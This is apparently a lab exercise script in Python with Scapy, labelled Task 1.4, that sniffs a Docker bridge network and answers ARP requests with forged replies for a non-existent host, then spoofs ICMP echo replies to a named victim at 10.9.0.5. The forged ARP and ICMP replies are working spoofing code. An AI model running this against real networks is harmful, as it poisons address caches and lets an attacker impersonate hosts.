######################
# TASK 1.4 - ARP (a non existing host on the lan)
######################

from scapy.all import sniff, ARP, Ether, send, IP, ICMP, Raw

#broadcastNet = "10.9.0.255"
#myMAC = get_if_hwaddr('eth0')

#my_mac = '02:42:fb:83:19:da' # 02:42:64:25:19:13
rnd_mac = '60:01:94:98:97:c6'
victim_mac = '02:42:0a:09:00:05'
victim_ip = '10.9.0.5'

""" this has to be combined with code2.py
def handler_pkt(pkt):
    if pkt[ARP].op == 1:
        reply = ARP(op=2, hwsrc=rnd_mac, psrc='10.9.0.99', hwdst=victim_mac, pdst=victim_ip)
        send(reply)
"""


def handler_pkt(pkt):
        if pkt.haslayer(ARP):
            if pkt[ARP].op == 1: # 1 --> who has | 2 --> is at
                #print(pkt.show())
                reply = ARP(op=2, hwsrc=rnd_mac, psrc='10.9.0.99', hwdst=victim_mac, pdst=victim_ip)
                send(reply)

        if pkt.haslayer(ICMP): 
            if str(pkt.getlayer(ICMP).type) == "8": 
                print("It's an echo request")
                ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
                icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
                data = pkt[Raw].load
                send(ip/icmp/data)


sniff(iface='br-fdf474324adb', filter='arp or icmp', prn=handler_pkt)

